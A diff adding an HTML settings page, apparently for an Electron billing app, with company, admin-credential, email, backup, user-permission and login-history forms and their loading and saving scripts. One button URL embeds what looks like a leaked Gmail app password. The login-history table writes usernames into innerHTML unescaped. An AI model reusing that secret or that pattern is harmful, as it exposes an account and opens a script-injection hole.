@@ -1,0 +1,1605 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Settings</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="settings.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/otpauth/9.1.4/otpauth.umd.min.js"></script>
+    <style>
+        :root {
+            --primary-color: #4a90e2;
+            --secondary-color: #f5f6fa;
+            --text-color: #2c3e50;
+            --danger-color: #e74c3c;
+            --success-color: #2ecc71;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #eef2f7;
+            margin: 0;
+            padding: 20px;
+            color: var(--text-color);
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            overflow: hidden;
+        }
+
+        .header {
+            background: var(--primary-color);
+            color: white;
+            padding: 20px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+
+        .btn-back {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-back:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        .section-title {
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            color: var(--primary-color);
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group.full-width {
+            grid-column: span 2;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        input,
+        select {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            border-color: var(--primary-color);
+            outline: none;
+        }
+
+        .security-box {
+            background: #fff5f5;
+            border: 1px solid #fed7d7;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+
+        .security-box h3 {
+            margin-top: 0;
+            color: #c53030;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .password-wrapper {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #777;
+        }
+
+        .btn-save {
+            background: var(--success-color);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: transform 0.1s;
+        }
+
+        .btn-save:active {
+            transform: scale(0.98);
+        }
+
+        .btn-danger {
+            background: var(--danger-color);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-cogs"></i> Settings</h1>
+            <button class="btn-back" onclick="window.location.href='dashboardB.html'"><i class="fas fa-arrow-left"></i>
+                Dashboard</button>
+        </div>
+
+        <div class="content">
+
+            <!-- General Settings -->
+            <div data-permission-id="perm_manage_company_info">
+                <div class="section-title">🏢 Company Information</div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label>Company Name</label>
+                        <input type="text" id="companyName" placeholder="e.g. Your Company Name">
+                    </div>
+                    <div class="form-group">
+                        <label>Contact Number</label>
+                        <input type="text" id="contactNumber" placeholder="e.g. 9876543210">
+                    </div>
+                    <div class="form-group">
+                        <label>Company Email</label>
+                        <input type="email" id="companyEmail" placeholder="e.g. contact@company.com">
+                    </div>
+                    <div class="form-group full-width">
+                        <label>Address Line 1</label>
+                        <input type="text" id="addressLine1" placeholder="Street, Area">
+                    </div>
+                    <div class="form-group full-width">
+                        <label>Address Line 2</label>
+                        <input type="text" id="addressLine2" placeholder="City, Pin Code">
+                        <div class="form-group">
+                            <label>Company Website</label>
+                            <input type="text" id="companyWebsite" placeholder="e.g. www.company.com">
+                        </div>
+                        <div class="form-group">
+                            <label>Company GSTIN</label>
+                            <input type="text" id="companyGstin" placeholder="e.g. 19ABCDE1234F1Z5"
+                                oninput="this.value = this.value.toUpperCase()">
+                        </div>
+                        <div class="form-group">
+                            <label>District</label>
+                            <select id="sellerDistrict"></select>
+                        </div>
+                        <div class="form-group">
+                            <label>Cash Receipt Limit (₹)</label>
+                            <input type="number" id="cashLimit" placeholder="e.g. 200000">
+                        </div>
+                        <div class="form-group">
+                            <label>Default BCC Email</label>
+                            <input type="email" id="defaultBcc" placeholder="e.g. archive@company.com">
+                        </div>
+                        <div class="form-group">
+                            <label>State</label>
+                            <select id="sellerState"></select>
+                        </div>
+
+                        <div style="text-align: right; margin-bottom: 40px;">
+                            <button class="btn-save" onclick="saveGeneralSettings()">Save Company Details</button>
+                        </div>
+                    </div>
+
+                    <!-- Security Settings -->
+                    <div class="security-box" data-permission-id="perm_manage_security_creds">
+                        <h3><i class="fas fa-shield-alt"></i> Admin Credentials & Email Configuration</h3>
+                        <p class="info-text">Configure the email account used for sending OTPs and the Admin login
+                            credentials.
+                        </p>
+
+                        <div class="form-grid">
+                            <div class="form-group">
+                                <label>Admin Username</label>
+                                <input type="text" id="adminUser">
+                            </div>
+                            <div class="form-group">
+                                <label>New Login Password</label>
+                                <div class="password-wrapper">
+                                    <input type="password" id="adminPass" placeholder="Leave empty to keep current">
+                                    <i class="fas fa-eye toggle-password" onclick="toggleVisibility('adminPass')"></i>
+                                </div>
+                            </div>
+
+                            <div class="form-group full-width">
+                                <label>Email Provider</label>
+                                <select id="emailProvider" onchange="toggleCustomEmailFields()">
+                                    <option value="Gmail">Gmail</option>
+                                    <option value="Custom">Custom (Other IMAP/SMTP)</option>
+                                </select>
+                            </div>
+
+                            <div id="customEmailFields"
+                                style="display: none; grid-column: span 2; grid-template-columns: 1fr 1fr; gap: 20px;">
+                                <div class="form-group">
+                                    <label>SMTP Host</label>
+                                    <input type="text" id="smtpHost" placeholder="e.g. smtp.yourdomain.com">
+                                </div>
+                                <div class="form-group">
+                                    <label>SMTP Port</label>
+                                    <input type="number" id="smtpPort" placeholder="e.g. 465">
+                                </div>
+                                <div class="form-group">
+                                    <label>IMAP Host</label>
+                                    <input type="text" id="imapHost" placeholder="e.g. imap.yourdomain.com">
+                                </div>
+                                <div class="form-group">
+                                    <label>IMAP Port</label>
+                                    <input type="number" id="imapPort" placeholder="e.g. 993">
+                                </div>
+                            </div>
+
+                            <div class="form-group full-width">
+                                <label>Sender Email Address</label>
+                                <input type="email" id="adminEmail" placeholder="your-email@gmail.com">
+                            </div>
+
+                            <div class="form-group full-width">
+                                <label>App Password / Email Password</label>
+                                <div style="display: flex; gap: 10px;">
+                                    <div class="password-wrapper" style="flex: 1;">
+                                        <input type="password" id="adminEmailPass"
+                                            placeholder="16-character App Password">
+                                        <i class="fas fa-eye toggle-password"
+                                            onclick="toggleVisibility('adminEmailPass')"></i>
+                                    </div>
+                                    <button class="btn-secondary"
+                                        onclick="if(document.getElementById('emailProvider').value === 'Gmail') window.open('https://myaccount.google.com/pnri gtst zsqj xnne', '_blank'); else alert('For custom providers, please refer to their documentation for App Passwords or IMAP credentials.')"
+                                        style="padding: 10px; background-color: #607d8b; color: white; border: none; border-radius: 6px; cursor: pointer;"
+                                        title="Generate Password">
+                                        <i class="fas fa-key"></i>
+                                    </button>
+                                </div>
+                                <div class="info-text">
+                                    Do not use your main Gmail password. Use an App Password.
+                                    <a href="https://myaccount.google.com/apppasswords" target="_blank"
+                                        style="color: #4a90e2;">Generate here</a>.
+                                </div>
+                                <div style="margin-top: 10px; text-align: right;">
+                                    <button class="btn-secondary" onclick="testEmailConfig(this)"
+                                        style="padding: 6px 12px; font-size: 13px; background-color: #6c757d; color: white; border: none; border-radius: 4px; cursor: pointer;">📧
+                                        Test Email Config</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div style="border-top: 1px dashed #ccc; padding-top: 20px; margin-top: 20px;">
+                            <div class="form-group">
+                                <label style="color: var(--danger-color);">Developer Authorization ID</label>
+                                <input type="password" id="devId" placeholder="Enter Developer ID to save changes">
+                            </div>
+                            <div style="display: flex; justify-content: space-between; align-items: center;">
+                                <button class="btn-danger" onclick="saveSecuritySettings()">Update Secure
+                                    Credentials</button>
+                                <button class="btn-secondary" onclick="openTotpSetup()"
+                                    style="background: #6f42c1; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer;">📱
+                                    Setup Authenticator</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Cloud Backup Settings -->
+                    <div class="security-box" style="margin-top: 20px; background: #e3f2fd; border-color: #90caf9;">
+                        <h3 style="color: #1976d2;"><i class="fas fa-cloud-upload-alt"></i> Cloud Backup Configuration
+                        </h3>
+                        <p class="info-text">Configure Google Apps Script URL for cloud backup.</p>
+
+                        <div class="form-group full-width">
+                            <label>Cloud Backup URL (GAS)</label>
+                            <div style="display: flex; gap: 5px;">
+                                <input type="text" id="cloudBackupUrl"
+                                    placeholder="https://script.google.com/macros/s/.../exec" style="flex: 1;">
+                                <button class="btn-secondary" onclick="openScriptDashboard()"
+                                    title="Open Google Apps Script Dashboard"
+                                    style="padding: 10px; background: #17a2b8; border: none; color: white; border-radius: 6px; cursor: pointer;"><i
+                                        class="fas fa-scroll"></i></button>
+                                <button class="btn-secondary" onclick="copyBackupScript()"
+                                    title="Copy Google Apps Script Code"
+                                    style="padding: 10px; background: #6f42c1; border: none; color: white; border-radius: 6px; cursor: pointer;"><i
+                                        class="fas fa-clipboard"></i></button>
+                                <button class="btn-secondary" onclick="testCloudConnection()" title="Test Connection"
+                                    style="padding: 10px; background: #28a745; border: none; color: white; border-radius: 6px; cursor: pointer;"><i
+                                        class="fas fa-signal"></i></button>
+                            </div>
+                        </div>
+                        <div style="text-align: right; margin-top: 10px;">
+                            <button class="btn-save" onclick="saveCloudSettings()">Save Cloud Settings</button>
+                        </div>
+                    </div>
+
+                    <!-- User Management -->
+                    <div data-permission-id="perm_manage_users">
+                        <div class="section-title" style="margin-top: 40px;">👥 User Management (Developer Only)</div>
+                        <div
+                            style="background: white; border: 1px solid #ddd; border-radius: 8px; padding: 20px; margin-bottom: 30px;">
+                            <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+                                <input type="text" id="newUsername" placeholder="Username" style="flex: 2;">
+                                <input type="password" id="newUserPass" placeholder="Password" style="flex: 2;">
+                                <select id="newUserRole"
+                                    style="flex: 1; padding: 10px; border: 1px solid #ddd; border-radius: 6px;">
+                                    <option value="Admin">Admin</option>
+                                    <option value="User">User</option>
+                                </select>
+                                <button class="btn-save" onclick="addUser()" style="padding: 10px 20px;">Add
+                                    User</button>
+                            </div>
+                            <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
+                                <thead style="background: #f8f9fa; border-bottom: 1px solid #ddd;">
+                                    <tr>
+                                        <th style="padding: 10px; text-align: left;">Username</th>
+                                        <th style="padding: 10px; text-align: left;">Role</th>
+                                        <th style="padding: 10px; text-align: center;">Status</th>
+                                        <th style="padding: 10px; text-align: left;">Last Login</th>
+                                        <th style="padding: 10px; text-align: center;">Permissions</th>
+                                        <th style="padding: 10px; text-align: right;">Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="userListBody"></tbody>
+                            </table>
+                            <div style="margin-top: 15px; text-align: right;">
+                                <input type="password" id="devIdForUsers" placeholder="Dev ID to Save Users"
+                                    style="padding: 8px; width: 200px; margin-right: 10px; border: 1px solid #ddd; border-radius: 4px;">
+                                <button class="btn-save" onclick="saveUsers()">💾 Save Users</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Advance Notice Management -->
+                    <div data-permission-id="perm_manage_users">
+                        <div class="section-title" style="margin-top: 40px;">📢 Advance Notice Configuration (Developer
+                            Only)</div>
+                        <div
+                            style="background: white; border: 1px solid #ddd; border-radius: 8px; padding: 20px; margin-bottom: 30px;">
+                            <p class="info-text" style="margin-top: 0; margin-bottom: 15px;">Configure the central
+                                Update/Notice Server URL.</p>
+                            <div class="form-grid">
+                                <div class="form-group full-width">
+                                    <label>Update & Notice Server URL (GAS)</label>
+                                    <input type="password" id="updateServerUrl"
+                                        value="https://script.google.com/macros/s/AKfycbxnbOTetUcmv22txVFGCb8pHkZI3snpimqMtcdZWvVRv-z2x4bHfVC0K2AxlOXvz8C4/exec"
+                                        placeholder="https://script.google.com/macros/s/.../exec">
+                                </div>
+                            </div>
+                            <div
+                                style="margin-top: 15px; text-align: right; border-top: 1px solid #eee; padding-top: 15px;">
+                                <input type="password" id="devIdForNotice" placeholder="Dev ID to Update"
+                                    style="padding: 8px; width: 200px; margin-right: 10px; border: 1px solid #ddd; border-radius: 4px;">
+                                <button class="btn-save" onclick="updateRemoteNotice()">🚀 Save URL</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Login History -->
+                    <div data-permission-id="perm_view_login_history">
+                        <div class="section-title"
+                            style="margin-top: 40px; display: flex; justify-content: space-between; align-items: center;">
+                            <span>🕒 Recent Login History</span>
+                            <button class="btn-danger" onclick="clearLoginHistory()"
+                                style="padding: 4px 10px; font-size: 12px;">Clear History</button>
+                        </div>
+                        <div
+                            style="background: white; border: 1px solid #ddd; border-radius: 8px; overflow-y: auto; max-height: 250px; margin-bottom: 30px;">
+                            <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
+                                <thead
+                                    style="background: #f8f9fa; border-bottom: 1px solid #ddd; position: sticky; top: 0; z-index: 1;">
+                                    <tr>
+                                        <th
+                                            style="padding: 12px 15px; text-align: left; color: #555; font-weight: 600;">
+                                            User
+                                        </th>
+                                        <th
+                                            style="padding: 12px 15px; text-align: left; color: #555; font-weight: 600;">
+                                            Time
+                                        </th>
+                                        <th
+                                            style="padding: 12px 15px; text-align: left; color: #555; font-weight: 600;">
+                                            Machine
+                                        </th>
+                                    </tr>
+                                </thead>
+                                <tbody id="loginHistoryBody">
+                                    <tr>
+                                        <td colspan="3" style="padding: 15px; text-align: center; color: #888;">Loading
+                                            history...
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+
+                    <!-- Danger Zone -->
+                    <div data-permission-id="perm_factory_reset">
+                        <div class="section-title"
+                            style="color: var(--danger-color); margin-top: 40px; border-bottom-color: #fed7d7;">⚠️
+                            Danger
+                            Zone
+                        </div>
+                        <div style="background: #fff5f5; border: 1px solid #fed7d7; padding: 20px; border-radius: 8px;">
+                            <h3 style="margin-top: 0; color: #c53030; font-size: 16px;">Factory Reset</h3>
+                            <p class="info-text" style="color: #c53030;">This action will permanently delete all local
+                                data
+                                including invoices, customers, items, and settings. This cannot be undone.</p>
+                            <button class="btn-danger" onclick="confirmFactoryReset()" style="width: 100%;">🗑️ Clear
+                                All
+                                Data
+                                (Factory Reset)</button>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+            <!-- Permissions Modal -->
+            <div id="permissionsModal" class="modal"
+                style="display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.5); align-items: center; justify-content: center;">
+                <div class="modal-content"
+                    style="background-color: white; padding: 20px; border-radius: 8px; width: 600px; max-width: 90%; max-height: 80vh; overflow-y: auto;">
+                    <h3 style="margin-top: 0; color: var(--primary-color);">Manage Permissions: <span
+                            id="permModalUser"></span>
+                    </h3>
+
+                    <!-- Role Manager Section -->
+                    <div class="role-manager-box"
+                        style="background: #f8f9fa; padding: 10px; border-radius: 6px; margin-bottom: 15px; border: 1px solid #dee2e6; text-align: left;">
+                        <h4 style="margin: 0 0 10px 0; font-size: 14px; color: #6c757d;">Manage Roles / Presets</h4>
+                        <div style="display: flex; gap: 5px; margin-bottom: 10px;">
+                            <select id="roleSelector"
+                                style="flex: 1; padding: 4px; border: 1px solid #ccc; border-radius: 4px;"></select>
+                            <button onclick="loadRole()"
+                                style="padding: 4px 8px; background: #17a2b8; color: white; border: none; border-radius: 4px; cursor: pointer;">Load</button>
+                            <button onclick="deleteRole()"
+                                style="padding: 4px 8px; background: #dc3545; color: white; border: none; border-radius: 4px; cursor: pointer;">Del</button>
+                        </div>
+                        <div style="display: flex; gap: 5px;">
+                            <input type="text" id="newRoleName" placeholder="New Role Name"
+                                style="flex: 1; padding: 4px; margin: 0; border: 1px solid #ccc; border-radius: 4px;">
+                            <button onclick="saveNewRole()"
+                                style="padding: 4px 8px; background: #28a745; color: white; border: none; border-radius: 4px; cursor: pointer;">Save</button>
+                        </div>
+                    </div>
+
+                    <input type="text" id="permissionSearch" placeholder="Search permissions..."
+                        oninput="filterPermissions()"
+                        style="width: 100%; padding: 8px; margin-bottom: 10px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px;">
+
+                    <div style="margin-bottom: 15px;">
+                        <button onclick="toggleAllPermissions(true)" style="padding: 5px 10px; cursor: pointer;">Select
+                            All</button>
+                        <button onclick="toggleAllPermissions(false)"
+                            style="padding: 5px 10px; cursor: pointer;">Deselect
+                            All</button>
+                    </div>
+                    <div id="permissionsGrid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                        <!-- Checkboxes injected here -->
+                    </div>
+                    <div style="margin-top: 20px; text-align: right;">
+                        <button class="btn-save" onclick="saveUserPermissions()">Save Permissions</button>
+                        <button class="btn-danger"
+                            onclick="document.getElementById('permissionsModal').style.display='none'">Close</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- The Custom Fields Manager Modal -->
+            <div id="customFieldModal" class="modal" style="display:none; position:fixed; z-index:2000; left:0; top:0; width:100%; height:100%; background:rgba(0,0,0,0.5); align-items:center; justify-content:center;">
+                <div class="modal-content" style="background:#fff; width:90%; max-width:850px; padding:20px; border-radius:8px; max-height:90vh; display:flex; flex-direction:column; text-align: left;">
+                    <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #ddd; padding-bottom:10px;">
+                        <h3 style="margin:0; color:#8e44ad;">⚙️ Manage Custom Fields (Dynamic Schema)</h3>
+                        <button onclick="closeCustomFieldModal()" style="background:#dc3545; color:white; border:none; padding:5px 10px; border-radius:4px; cursor:pointer; font-size:16px;">&times;</button>
+                    </div>
+
+                    <div style="display:flex; gap:20px; margin-top:15px; flex:1; overflow:hidden;">
+                        <!-- Form Section -->
+                        <div style="flex:1; background:#f8f9fa; padding:15px; border-radius:6px; overflow-y:auto;">
+                            <h4 style="margin-top:0; margin-bottom: 10px; border-bottom: 1px solid #ddd; padding-bottom: 5px;">Add / Edit Field</h4>
+                            <input type="hidden" id="cfId">
+                            
+                            <label style="font-weight:bold; font-size:13px; display:block; margin-top:10px;">Target Module / New Page Name *</label>
+                            <input type="text" id="cfModule" list="cfModuleList" placeholder="e.g., Customer, Vehicle, Project" style="width:100%; padding:8px; margin-bottom:10px; border: 1px solid #ddd; border-radius: 4px;">
+                            <datalist id="cfModuleList">
+                                <option value="Customer">
+                                <option value="Invoice">
+                                <option value="Item">
+                                <option value="Supplier">
+                            </datalist>
+
+                            <label style="font-weight:bold; font-size:13px; display:block;">Field Label (UI Name) *</label>
+                            <input type="text" id="cfLabel" placeholder="e.g., Blood Group" style="width:100%; padding:8px; margin-bottom:10px; border: 1px solid #ddd; border-radius: 4px;" oninput="generateFieldKey()">
+
+                            <label style="font-weight:bold; font-size:13px; display:block;">Internal Field Key (DB Name) *</label>
+                            <input type="text" id="cfName" placeholder="e.g., blood_group" style="width:100%; padding:8px; margin-bottom:10px; background:#e9ecef; border: 1px solid #ddd; border-radius: 4px;" readonly>
+
+                            <label style="font-weight:bold; font-size:13px; display:block;">Field Type *</label>
+                            <select id="cfType" style="width:100%; padding:8px; margin-bottom:10px; border: 1px solid #ddd; border-radius: 4px;" onchange="toggleCfOptions()">
+                                <option value="text">Text (String)</option>
+                                <option value="number">Number</option>
+                                <option value="date">Date</option>
+                                <option value="boolean">Checkbox (Yes/No)</option>
+                                <option value="select">Dropdown (Select)</option>
+                            </select>
+
+                            <div id="cfOptionsWrapper" style="display:none;">
+                                <label style="font-weight:bold; font-size:13px; display:block;">Dropdown Options (Comma separated) *</label>
+                                <input type="text" id="cfOptions" placeholder="e.g., A+, O+, B-, AB+" style="width:100%; padding:8px; margin-bottom:10px; border: 1px solid #ddd; border-radius: 4px;">
+                            </div>
+
+                            <div style="display:flex; gap:15px; margin-bottom:15px; margin-top:5px;">
+                                <label style="cursor:pointer; font-size:14px; display: flex; align-items: center; gap: 5px; font-weight: normal;"><input type="checkbox" id="cfRequired" style="width: auto;"> Is Required?</label>
+                                <label style="cursor:pointer; font-size:14px; display: flex; align-items: center; gap: 5px; font-weight: normal;"><input type="checkbox" id="cfActive" checked style="width: auto;"> Is Active?</label>
+                            </div>
+
+                            <label style="font-weight:bold; font-size:13px; display:block;">Display Order</label>
+                            <input type="number" id="cfOrder" value="0" style="width:100%; padding:8px; margin-bottom:15px; border: 1px solid #ddd; border-radius: 4px;">
+
+                            <button onclick="saveCustomField()" class="btn-save" style="width:100%; margin-bottom: 8px;">Save Field</button>
+                            <button onclick="clearCustomFieldForm()" class="btn-danger" style="width:100%;">Clear</button>
+                        </div>
+
+                        <!-- Table Section -->
+                        <div style="flex:2; overflow-y:auto; border: 1px solid #ddd; border-radius: 6px;">
+                            <table style="width:100%; border-collapse:collapse; font-size:13px;">
+                                <thead style="background:#eee; position:sticky; top:0; z-index: 1;">
+                                    <tr>
+                                        <th style="padding:8px; border-bottom:1px solid #ddd; text-align: left;">Module</th>
+                                        <th style="padding:8px; border-bottom:1px solid #ddd; text-align: left;">Label</th>
+                                        <th style="padding:8px; border-bottom:1px solid #ddd; text-align: left;">Type</th>
+                                        <th style="padding:8px; border-bottom:1px solid #ddd; text-align: center;">Req/Act</th>
+                                        <th style="padding:8px; border-bottom:1px solid #ddd; text-align: center; width:80px;">Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="customFieldsTableBody">
+                                    <tr><td colspan="5" style="text-align:center; padding:20px;">Loading fields...</td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TOTP Setup Modal -->
+            <div id="totpSetupModal" class="modal">
+                <div class="modal-content" style="width: 400px; text-align: center;">
+                    <span class="close" onclick="closeTotpSetupModal()"
+                        style="float:right; cursor:pointer; font-size:20px;">&times;</span>
+                    <h3 style="color: #6f42c1;">📱 Setup Authenticator</h3>
+                    <p style="font-size: 13px; color: #666;">Scan this QR code with Google Authenticator or Authy.</p>
+                    <div id="totpQrCode"
+                        style="margin: 15px auto; width: 200px; height: 200px; border: 1px solid #ddd; display: flex; align-items: center; justify-content: center;">
+                        <img id="totpQrImage" src="" style="max-width: 100%; max-height: 100%;">
+                    </div>
+                    <p style="font-size: 12px; color: #888;">Secret: <span id="totpSecretDisplay"
+                            style="font-family: monospace; color: #333;"></span></p>
+                    <input type="text" id="totpVerifyInput" placeholder="Enter 6-digit Code" maxlength="6"
+                        style="text-align: center; letter-spacing: 3px; font-weight: bold; width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px;">
+                    <button onclick="verifyTotpSetup()" class="btn-save" style="width: 100%;">Verify & Enable</button>
+                </div>
+            </div>
+
+            <script>
+                // Load Settings on Page Load
+                window.currentAdminUsers = [];
+
+                function populateStates() {
+                    const stateSelect = document.getElementById('sellerState');
+                    if (!stateSelect) return;
+                    stateSelect.innerHTML = '<option value="">Select State</option>';
+                    if (typeof STATE_MASTER_LIST !== 'undefined') {
+                        STATE_MASTER_LIST.forEach(s => {
+                            const opt = document.createElement('option');
+                            opt.value = s.name;
+                            opt.textContent = s.name;
+                            stateSelect.appendChild(opt);
+                        });
+                    }
+                    stateSelect.addEventListener('change', () => populateDistricts(stateSelect.value));
+                }
+
+                function populateDistricts(stateName, selectedDistrict = '') {
+                    const districtSelect = document.getElementById('sellerDistrict');
+                    if (!districtSelect) return;
+                    districtSelect.innerHTML = '<option value="">Select District</option>';
+                    if (typeof DISTRICTS_MASTER_LIST !== 'undefined' && DISTRICTS_MASTER_LIST[stateName]) {
+                        const districts = DISTRICTS_MASTER_LIST[stateName];
+                        districts.forEach(d => {
+                            const opt = document.createElement('option');
+                            opt.value = d;
+                            opt.textContent = d;
+                            districtSelect.appendChild(opt);
+                        });
+                    }
+                    if (selectedDistrict) {
+                        districtSelect.value = selectedDistrict;
+                    }
+                }
+
+                function toggleCustomEmailFields() {
+                    const provider = document.getElementById('emailProvider').value;
+                    document.getElementById('customEmailFields').style.display = provider === 'Custom' ? 'grid' : 'none';
+                }
+
+                document.addEventListener('DOMContentLoaded', async () => {
+                    populateStates();
+
+                    try {
+                        // 1. Load General Settings
+                        let settings = {};
+                        try {
+                            const res = await fetch('http://localhost:5000/api/settings');
+                            const apiData = await res.json();
+                            if (apiData.success && apiData.data) settings = apiData.data;
+                        } catch (e) {
+                            console.warn("MongoDB fetch failed, falling back to local files", e);
+                        }
+
+                        if (Object.keys(settings).length === 0 && window.electronAPI && window.electronAPI.getAppSettings) {
+                            const localSettings = await window.electronAPI.getAppSettings();
+                            if (localSettings.success) settings = localSettings;
+                        }
+
+                        document.getElementById('companyName').value = settings.companyName || '';
+                        document.getElementById('contactNumber').value = settings.contactNumber || '';
+                        document.getElementById('companyEmail').value = settings.companyEmail || '';
+                        document.getElementById('defaultBcc').value = settings.defaultBcc || '';
+                        document.getElementById('companyWebsite').value = settings.companyWebsite || '';
+                        document.getElementById('companyGstin').value = settings.companyGstin || '';
+                        document.getElementById('sellerState').value = settings.sellerState || '';
+                        populateDistricts(settings.sellerState, settings.district);
+                        document.getElementById('cashLimit').value = settings.cashLimit || '';
+                        document.getElementById('addressLine1').value = settings.addressLine1 || '';
+                        document.getElementById('addressLine2').value = settings.addressLine2 || '';
+                        renderLoginHistory(settings.loginHistory || []);
+
+                        document.getElementById('cloudBackupUrl').value = settings.cloudBackupUrl || localStorage.getItem('cloudBackupUrl') || '';
+                        document.getElementById('updateServerUrl').value = settings.updateServerUrl || localStorage.getItem('updateServerUrl') || "https://script.google.com/macros/s/AKfycbxnbOTetUcmv22txVFGCb8pHkZI3snpimqMtcdZWvVRv-z2x4bHfVC0K2AxlOXvz8C4/exec";
+
+                        // 2. Load Admin Username/Email (Passwords are hidden)
+                        const creds = await window.electronAPI.getAdminCreds();
+                        if (creds.success) {
+                            document.getElementById('adminUser').value = creds.adminUser || '';
+                            document.getElementById('adminEmail').value = creds.adminEmail || '';
+
+                            if (document.getElementById('emailProvider')) {
+                                document.getElementById('emailProvider').value = creds.emailProvider || 'Gmail';
+                                document.getElementById('smtpHost').value = creds.smtpHost || '';
+                                document.getElementById('smtpPort').value = creds.smtpPort || '';
+                                document.getElementById('imapHost').value = creds.imapHost || '';
+                                document.getElementById('imapPort').value = creds.imapPort || '';
+                                toggleCustomEmailFields();
+                            }
+                            // Refresh user list every 30 seconds for online status
+                            if (window.userListInterval) clearInterval(window.userListInterval);
+                            window.userListInterval = setInterval(renderUserList, 30000);
+
+                            window.currentAdminUsers = creds.adminUsers || [];
+                            renderUserList();
+                        }
+                    } catch (error) {
+                        console.error("Failed to load settings:", error);
+                    }
+                });
+
+                function renderLoginHistory(history) {
+                    const tbody = document.getElementById('loginHistoryBody');
+                    tbody.innerHTML = '';
+
+                    if (!history || history.length === 0) {
+                        tbody.innerHTML = '<tr><td colspan="3" style="padding: 15px; text-align: center; color: #888;">No login history found.</td></tr>';
+                        return;
+                    }
+
+                    history.forEach(entry => {
+                        const date = new Date(entry.timestamp).toLocaleString('en-GB');
+                        const tr = document.createElement('tr');
+                        tr.style.borderBottom = '1px solid #eee';
+                        tr.innerHTML = `
+                <td style="padding: 10px 15px;">${entry.username || 'Unknown'}</td>
+                <td style="padding: 10px 15px;">${date}</td>
+                <td style="padding: 10px 15px;">${entry.machine || 'Unknown'}</td>
+            `;
+                        tbody.appendChild(tr);
+                    });
+                }
+
+                // Save General Settings
+                async function saveGeneralSettings() {
+                    const data = {
+                        companyName: document.getElementById('companyName').value,
+                        contactNumber: document.getElementById('contactNumber').value,
+                        companyEmail: document.getElementById('companyEmail').value,
+                        defaultBcc: document.getElementById('defaultBcc').value,
+                        companyWebsite: document.getElementById('companyWebsite').value,
+                        companyGstin: document.getElementById('companyGstin').value,
+                        sellerState: document.getElementById('sellerState').value,
+                        district: document.getElementById('sellerDistrict').value,
+                        addressLine1: document.getElementById('addressLine1').value,
+                        addressLine2: document.getElementById('addressLine2').value
+                    };
+
+                    // Save to MongoDB via API
+                    try {
+                        await fetch('http://localhost:5000/api/settings', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(data)
+                        });
+                    } catch (e) {
+                        console.error('Failed to sync settings to MongoDB', e);
+                    }
+
+                    // Save to localStorage for immediate browser availability
+                    Object.keys(data).forEach(key => {
+                        if (data[key]) localStorage.setItem(key, data[key]);
+                    });
+
+                    if (window.electronAPI && window.electronAPI.saveAppSettings) {
+                        const result = await window.electronAPI.saveAppSettings(data);
+                        if (!result.success) console.error("Electron API Error: " + result.message);
+                    }
+
+                    alert("Company details saved successfully!");
+                    syncCompanyDetailsToCloud(data);
+                }
+
